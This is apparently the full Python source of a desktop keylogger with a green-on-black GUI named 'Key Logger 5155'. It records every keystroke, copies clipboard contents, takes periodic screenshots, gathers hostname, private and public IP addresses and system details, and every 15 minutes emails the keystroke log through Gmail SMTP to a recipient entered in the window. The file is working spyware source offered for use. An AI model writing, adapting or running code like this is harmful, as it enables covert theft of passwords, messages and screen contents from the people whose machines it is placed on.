# Import necessary libraries
import logging
import os
import platform
import smtplib
import socket
import threading
import tkinter
import urllib.error
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from time import sleep
from tkinter import messagebox, StringVar, Tk
from urllib.request import urlopen

from PIL import ImageGrab, Image, ImageTk
from customtkinter import CTk, CTkLabel, CTkFrame, CTkEntry, CTkButton, set_appearance_mode, CTkImage
from dotenv import load_dotenv
from pynput.keyboard import Listener

import glob
from datetime import datetime

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(filename="data/key_log.txt", level=logging.DEBUG, format='%(asctime)s, %(message)s')

# File paths for various log files
keys_information = "data/key_log.txt"
system_information = "data/systeminfo.txt"
clipboard_information = "data/clipboard.txt"
SCREENSHOT_DIR="data/screenshots"

# Retrieve email and password from environment variables
email_address = os.getenv('email')
password = os.getenv('pass')

# Global variables for email sending
toAddr = "" 
state = 0
stopFlag = False


# Function to handle closing of the application window
def on_closing():
    global stopFlag
    if messagebox.askokcancel("Quit", "Do you want to quit?"):
        stopFlag = True
        root.destroy()


# Function to send email with attachment
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "LOG file"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()


# Function to gather system information
def computer_information():
    with open(system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        try:
            with urlopen("https://api.ipify.org", timeout=10) as response:
                public_ip = response.read().decode()
            f.write(f"Public IP Address: {public_ip}\n")
        except urllib.error.URLError:
            # called if say there's something causing the connection request to fail
            f.write("Public IP Address: Couldn't get Public IP Address\n")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


# Function to copy clipboard content
def copy_clipboard():
    with open(clipboard_information, "a") as f:
        try:
            r = Tk()
            r.withdraw()
            pasted_data = r.clipboard_get()
            f.write("\nClipboard Data: \n" + pasted_data)
        except tkinter.TclError:
            f.write("\nClipboard could be not be copied")


# Function to take screenshot
def screenshot():
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)

    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

    screenshot_information = os.path.join(SCREENSHOT_DIR, f"screenshot_{timestamp}.png")

    im = ImageGrab.grab()
    im.save(screenshot_information)

    print(f"Saved screenshot: {screenshot_information}")
    limit_screenshots(SCREENSHOT_DIR, keep=10)



def limit_screenshots(directory, keep=10):

    """Delete old screenshots if more than 'keep' exist."""

    screenshots = sorted(
        glob.glob(os.path.join(directory, "*.png")),
        key=os.path.getmtime
    )

    if len(screenshots) > keep:
        for old_file in screenshots[:-keep]:
            try:
                os.remove(old_file)
                print(f"Deleted old screenshot: {old_file}")
            except Exception as e:
                print(f"Error deleting {old_file}: {e}")



# Global variables for key logging
count = 0
keys = []


# Function to handle key press event
def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


# Function to write key logs to file
def write_file(keys):
    for key in keys:
        k = str(key).replace("'", "")
        logging.info(k)


listener = Listener(on_press=on_press)


# Function to start keylogger
def start_logger():
    global listener, toAddr, btnStr
    count = 900
    listener.start()
    btnStr.set("Stop Keylogger")
    screenshot()
    while True:
        print(count)
        if stopFlag:
            break
        if count % 30 == 0:
            copy_clipboard()
        if count == 0:
            screenshot()
            computer_information()
            if email_address and password and toAddr != "":
                try:
                    send_email(keys_information, keys_information, toAddr)
                except:
                    pass
            count = 900
        sleep(1)
        count -= 1
    listener.stop()
    btnStr.set("Start Keylogger")
    listener = Listener(on_press=on_press)


# Function to handle button click event
def on_button_click():
    global state, toAddr, listener, stopFlag, receiver_entry, btnStr
    toAddr = receiver_entry.get()

    current_state = receiver_entry.cget("state")

    if current_state == 'normal':
        receiver_entry.configure(state="disabled")
        btnStr.set("Starting...")
    else:
        receiver_entry.configure(state="normal")
        btnStr.set("Stopping...")
    if state == 0:
        state = 1
        print(state)
        stopFlag = False
        thread = threading.Thread(target=start_logger)
        thread.start()
    elif state == 1:
        state = 0
        print(state)
        stopFlag = True
        btnStr.set("Start Keylogger")


# Create the root window
set_appearance_mode("dark")
root = CTk()  # Creating root window using customTkinter, it allows to change color of Title bar unlike the official tkinter
root.geometry("800x600")
root.resizable(False, False)
root.protocol("WM_DELETE_WINDOW", on_closing)

# Main frame to hold all widgets and center them
main_frame = CTkFrame(root, fg_color="transparent")
main_frame.pack(expand=True)

# Set initial button text
btnStr = StringVar()
btnStr.set("Start Keylogger")

# Load and set icon on Title bar
root.after(201, lambda: root.iconbitmap('cracking.ico'))

# Display an image
image = Image.open('cracking.png')
resize_image = image.resize((300, 300))
img = CTkImage(light_image=resize_image, size=(240, 240))
icon = CTkLabel(main_frame, image=img, text="")
icon.pack(pady=(20, 0))

# Set window title
root.title("Key Logger 5155")

# Display title label
Title = CTkLabel(main_frame, text="Key Logger 5155", font=("Cascadia Code", 50, "bold"), text_color="#00ff00")
Title.pack(pady=(10, 20))

# Frame for input widgets
InputFrame = CTkFrame(main_frame, fg_color="transparent")
InputFrame.pack(pady=10)

# Widgets for email address entry
receiver_label = CTkLabel(InputFrame, text="Recipient's E-mail Address : ", font=("Cascadia Code", 13, "bold"),
                          text_color="#00ff00")
receiver_entry = CTkEntry(InputFrame, width=300, font=("Cascadia Code", 13, "bold"),
                          placeholder_text="Enter recipient's email...", border_color="#00ff00", border_width=2)
receiver_entry.grid(row=0, column=1, padx=10)
receiver_label.grid(row=0, column=0)

# Button to start/stop keylogger
button = CTkButton(main_frame, textvariable=btnStr, command=on_button_click, width=200,
                   font=("Cascadia Code", 13, "bold"), fg_color="#00ff00", hover_color="#008F11",
                   text_color="#000000", corner_radius=6, border_width=2, border_color="#000000")
button.pack(pady=20)

# Run the main event loop
root.mainloop()
